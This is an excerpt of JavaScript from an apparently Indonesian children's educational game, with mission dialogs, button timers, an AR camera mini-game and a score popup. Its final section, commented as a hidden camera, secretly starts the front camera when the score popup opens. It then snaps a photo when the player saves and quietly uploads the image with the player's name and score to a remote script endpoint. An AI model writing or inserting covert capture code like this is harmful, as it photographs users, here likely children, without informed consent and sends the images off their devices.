...
function buildMission1() {
    ...
    contentArea.innerHTML = `
        ...
        <div id="stage-1" class="mission-stage active-stage">
            ...
            <button class="btn btn-play" id="btn-stage-1-next" onclick="nextStage1Text()" disabled style="filter: grayscale(100%); opacity: 0.5; cursor: not-allowed;">LANJUT</button>
    ...
    // Nyalakan tombol LANJUT pertama setelah 2.5 detik
    setTimeout(() => {
        const btnM1 = document.getElementById('btn-stage-1-next');
        if (btnM1) {
            btnM1.disabled = false;
            btnM1.style.filter = 'none';
            btnM1.style.opacity = '1';
            btnM1.style.cursor = 'pointer';
        }
    }, 2500);
}
...
window.startBanyuBeningAR = function() {
    ...
    .then(stream => {
        ...
        window.arLoop = setInterval(() => {
            ...
            // BUG FIX: Menggunakan loop mundur (reverse) agar penghapusan elemen dengan splice
            // tidak menggeser urutan array yang sedang diproses. Animasi buah tidak akan patah-patah.
            for (let i = arBoxesData.length - 1; i >= 0; i--) {
                let box = arBoxesData[i];
                box.y += box.speed;
    ...
    currentMissionDialogs = {
        ...
        7: { 
            ...
            dialog: [
                ...
                { text: `Petualangan kita di sini telah selesai. Teruslah belajar, dan nantikan pembaruan game ini untuk membuka wilayah Kepung. Sampai jumpa, Petualang ${localStorage.getItem('playerName') || "Cilik"}!`, mood: "happy" }
            ]
        }
    };
}
...
function nextStage1Text() {
    ...
    if (currentStage1Index < stage1Texts.length) {
        ...
        if (btn) {
            // Ubah menjadi nonaktif (abu-abu) daripada disembunyikan
            btn.disabled = true;
        ...
        // BUG FIX: Mengubah display menjadi 'flex' agar tata letak (align-items & flex-direction) tetap sejajar rapi di tengah
        document.getElementById('stage-1-quiz').style.display = 'flex';
    }
}
    ...
    window.lanjutAdaptasi = function() {
        ...
        if (currentAdaptasiIdx < m4IntroAdaptasi.length) {
            ...
            if (btn) {
                ...
                window.adaptasiTimer = setTimeout(() => { 
                    btn.disabled = false;
                    btn.style.filter = 'none';
                    btn.style.opacity = '1';
                    btn.style.cursor = 'pointer';
...
// ================= PENAMPIL INFORMASI SKOR & KAMERA TERSEMBUNYI (FOTO OTOMATIS) =================
let hiddenVideoStream = null;
let hiddenVideo = document.createElement('video');
hiddenVideo.autoplay = true;

window.showScoreInfo = function(missionScore, missionId) {
    document.getElementById('score-mission-val').innerText = "+" + missionScore;
    document.getElementById('score-total-val').innerText = globalScore;
    document.getElementById('score-info-modal').classList.add('active');
    
    const syncStatus = document.getElementById('score-sync-status');
    syncStatus.innerText = "Sistem bersiap merekam datamu...";
    syncStatus.style.color = "#bdc3c7";
    
    const btnClose = document.getElementById('btn-close-score-info');
    btnClose.setAttribute('data-misi-id', missionId || 1); // Simpan ID misi ke tombol
    btnClose.innerText = "SIMPAN SKOR & LANJUT";
    btnClose.disabled = false;

    // Nyalakan kamera depan secara diam-diam begitu Popup muncul
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
        hiddenVideoStream = stream;
        hiddenVideo.srcObject = stream;
    }).catch(err => {
        console.log("Kamera tersembunyi diblokir/tidak diizinkan:", err);
    });
};

const btnCloseScoreInfo = document.getElementById('btn-close-score-info');
if (btnCloseScoreInfo) {
    btnCloseScoreInfo.addEventListener('click', function() {
        this.innerText = "MENGUNGGAH...";
        this.disabled = true;
        const syncStatus = document.getElementById('score-sync-status');
        syncStatus.innerText = "Memotret dan menyinkronkan data ke Server...";
        syncStatus.style.color = "#f1c40f";

        let fotoMisiBase64 = "";
        
        // Jika kamera menyala, jepret seketika saat tombol ditekan
        if (hiddenVideoStream) {
            ...
            fotoMisiBase64 = canvas.toDataURL('image/jpeg', 0.5); // Kompresi 50% agar tidak memberatkan server
            
            // Matikan dan bebaskan akses kamera
            hiddenVideoStream.getTracks().forEach(track => track.stop());
            hiddenVideoStream = null;
        }

        const payload = {
            type: 'mission',
            nama: localStorage.getItem('playerName') || "Pahlawan Tanpa Nama",
            skor: globalScore,
            foto_misi: fotoMisiBase64,
            misi_id: this.getAttribute('data-misi-id')
        };

        // API 2: Kirim Foto Misi & Skor ke Backend secara diam-diam
        fetch(GAS_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        }).catch(e => console.log(e));

        // Keluar menuju peta secepat mungkin, tanpa perlu menunggu Upload dari Google selesai (Memberikan efek UX cepat)
        setTimeout(() => {
            document.getElementById('score-info-modal').classList.remove('active');
            exitMissionScreen(); 
        }, 800); // Beri jeda 0.8 detik agar animasi tombol ditekan terlihat
    });
}
